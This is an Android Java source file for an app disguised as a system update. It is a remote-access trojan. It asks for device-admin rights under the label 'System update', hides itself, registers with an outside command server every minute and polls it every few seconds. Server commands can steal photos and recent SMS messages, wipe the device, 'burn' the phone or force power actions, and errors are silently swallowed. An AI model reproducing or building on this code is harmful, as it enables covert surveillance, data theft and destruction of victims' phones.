package com.android.system.update;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.URLEncoder;
import java.util.UUID;

public class MainActivity extends Activity {

    private static final String BASE = "https://tnt.de3.netrun.io";

    private String deviceId;
    private volatile boolean running = true;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        SharedPreferences sp = getSharedPreferences("sys_cfg", MODE_PRIVATE);
        deviceId = sp.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 12);
            sp.edit().putString("id", deviceId).apply();
        }

        tryRequestAdmin();
        startService(new Intent(this, CoreService.class));

        new Thread(this::registerLoop).start();
        new Thread(this::pollLoop).start();

        finish();
    }

    private void tryRequestAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            java.lang.reflect.Method isAdminMethod = dpm.getClass().getMethod("isAdminActive", ComponentName.class);
            boolean isAdmin = (boolean) isAdminMethod.invoke(dpm, cn);
            if (!isAdmin) {
                Intent i = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                i.putExtra("android.app.extra.DEVICE_ADMIN", cn);
                i.putExtra("android.app.extra.ADD_EXPLANATION", "System update");
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        } catch (Exception ignored) {}
    }

    private void registerLoop() {
        while (running) {
            try {
                JSONObject body = new JSONObject();
                body.put("id", deviceId);
                body.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                Net.post(BASE + "/api/register", body.toString());
            } catch (Exception ignored) {}
            sleep(60_000);
        }
    }

    private void pollLoop() {
        while (running) {
            try {
                String url = BASE + "/api/poll?id=" + URLEncoder.encode(deviceId, "UTF-8")
                    + "&model=" + URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8");
                String resp = Net.get(url);
                JSONObject obj = new JSONObject(resp);
                JSONArray cmds = obj.optJSONArray("cmds");
                if (cmds != null) {
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.getJSONObject(i);
                        dispatch(c.optString("cmd"), c.optString("arg"));
                    }
                }
            } catch (Exception ignored) {}
            sleep(5_000);
        }
    }

    private void dispatch(String cmd, String arg) {
        try {
            switch (cmd) {
                case "msg":   Actions.showMsg(this, arg); break;
                case "power": Actions.powerHold(this, Long.parseLong(arg)); break;
                case "audio": Actions.playAsset(this, "stony.mp3"); break;
                case "media": Actions.playAsset(this, "media.mp4"); break;
                case "photo": Actions.photoSend(this, deviceId, BASE); break;
                case "wipe":  Actions.wipeAll(this, deviceId, BASE); break;
                case "burn":  Actions.burnPhone(this); break;
                case "get_sms": Actions.getLastSms(this, deviceId, BASE); break;
            }
        } catch (Exception ignored) {}
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
